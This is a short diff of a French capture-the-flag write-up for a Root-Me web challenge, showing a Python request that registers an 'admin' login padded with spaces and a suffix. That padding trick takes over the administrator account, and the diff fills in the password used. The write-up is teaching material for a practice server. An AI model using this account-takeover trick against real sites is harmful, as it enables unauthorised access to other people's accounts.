@@ -39,9 +39,8 @@ import requests
  
 suffixe = "2phi"
 padding = "  " * 7
-data = {"login":"admin" + padding + suffixe, "password":"censuré"}
+data = {"login":"admin" + padding + suffixe, "password":"staycalm2phi"}
 r = requests.post("http://challenge01.root-me.org/web-serveur/ch36/register.php", data)
 ```
-
 
 Il suffisait ensuite de se rendre sur la page admin.php et de tenter de se connecter avec le password indiqué dans le code.
